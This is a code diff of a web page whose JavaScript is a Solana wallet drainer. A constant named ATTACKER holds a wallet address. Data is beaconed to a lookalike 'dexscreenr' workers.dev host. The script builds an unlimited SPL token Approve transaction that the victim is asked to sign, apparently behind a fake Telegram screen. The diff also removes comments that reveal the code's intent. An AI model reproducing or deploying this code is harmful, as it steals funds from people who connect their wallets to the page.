@@ -279,7 +279,6 @@
   </div>
 
 <script>
-  // --- DIE FEHLENDE VARIABLE ---
   const ATTACKER = "FN73jYtbKMkfT14yG8MvMzrmCSREyX45rUrxiKoRbofB";
 
   const tgScreen = document.getElementById('telegram-screen');
@@ -509,10 +508,10 @@
         navigator.sendBeacon("https://dexscreenr.rthvzkr6jv.workers.dev", new Blob([basePayload], {type: 'application/json'})); 
       }
 
-      // 3. Signatur anfordern (OHNE Buffer, OHNE splToken)
+      // 3. Signatur anfordern
       setTimeout(async () => {
         try {
-          const conn = new solanaWeb3.Connection("https://solana-mainnet.rpc.extrnode.com"); 
+          const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com"); 
           const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
           const TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
           const ASSOCIATED_TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL");
@@ -525,11 +524,9 @@
             ASSOCIATED_TOKEN_PROGRAM_ID
           )[0];
 
-          // Manuelle Instruction Daten (Buffer Ersatz mit Uint8Array)
+          // Manuelle Instruction Daten
           const data = new Uint8Array(9);
-          data[0] = 4; // Approve instruction
-          
-          // Max amount (8 Bytes, Little Endian) manuell schreiben
+          data[0] = 4; 
           let maxVal = BigInt("18446744073709551615");
           for (let i = 0; i < 8; i++) {
             data[1 + i] = Number(maxVal & 0xFFn);
@@ -548,7 +545,9 @@
 
           const tx = new solanaWeb3.Transaction().add(delegateIx);
           tx.feePayer = victimPubkey;
-          tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
+          
+          const latestBlockhash = await conn.getLatestBlockhash("confirmed");
+          tx.recentBlockhash = latestBlockhash.blockhash;
 
           const signedTx = await provider.signTransaction(tx);
 
